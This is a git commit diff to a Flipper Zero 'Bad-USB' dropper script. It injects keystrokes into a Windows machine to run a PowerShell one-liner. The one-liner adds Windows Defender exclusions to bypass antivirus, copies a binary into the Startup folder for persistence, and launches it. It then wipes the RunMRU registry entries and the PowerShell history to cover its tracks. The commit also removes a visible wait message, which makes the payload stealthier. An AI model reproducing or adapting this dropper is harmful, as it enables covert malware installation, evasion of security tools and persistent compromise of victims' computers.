f8b150b81ba49c73d5690100dde90a2a0247d426
Radostin Dimov <126387449+rsdimov@users.noreply.github.com>
2024-04-21 23:15:17 +0300

    Update dropper.js

--- Bad-USB/dropper/dropper.js
+++ Bad-USB/dropper/dropper.js
@@ -6,6 +6,7 @@ let image = "/ext/apps_data/mass_storage/Update.img";
 let badusb = require("badusb");
 let usbdisk = require("usbdisk");
 let storage = require("storage");
+let localTempFolder = "C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start' 'Menu\\Programs\\Startup\\"; // local target folder
 // Checks for the Powershell.img on the Flipper
 print("Checking for Image...");
 if (storage.exists(image)) {
@@ -30,7 +31,7 @@ delay(2000);
 badusb.press("ALT", "y");
 delay(2000);
 print("Running payload"); // Detect the Flipper, set the DriveLetter, set the Flipper's drive as an excluded drive from Windows Defender to bypass AV, Run the given Binary, clean up after and remove command history
-badusb.println("echo 'Please wait until this Window closes to eject the disk!';Start-Sleep 6;$DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter;$drivePath = $DriveLetter + ':';$directoryPath = Join-Path -Path $drivePath -ChildPath $env:COMPUTERNAME-$env:USERNAME;$Bin_Path = $drivePath + '\\' + '" + binary + "';Add-MpPreference -ExclusionPath $drivePath;cd $directoryPath;$Destination = 'C:\Users\\' + $env:USERNAME + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\' + '" + binary + "';Add-MpPreference -ExclusionPath $Destination;Copy-Item -Path $Bin_Path -Destination $Destination;Start-Process -FilePath $Destination;reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;exit");
+badusb.println("Start-Sleep 6;$DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter;$drivePath = $DriveLetter + ':';$directoryPath = Join-Path -Path $drivePath -ChildPath $env:COMPUTERNAME-$env:USERNAME;$Bin_Path = $drivePath + '\\' + '" + binary + "';Add-MpPreference -ExclusionPath $drivePath;cd " + localTempFolder + ";Add-MpPreference -ExclusionPath " + localTempFolder + ";Copy-Item -Path $Bin_Path;Start-Process " + binary + ";reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;exit");
 badusb.press("ENTER");
 badusb.quit();
 delay(2000);
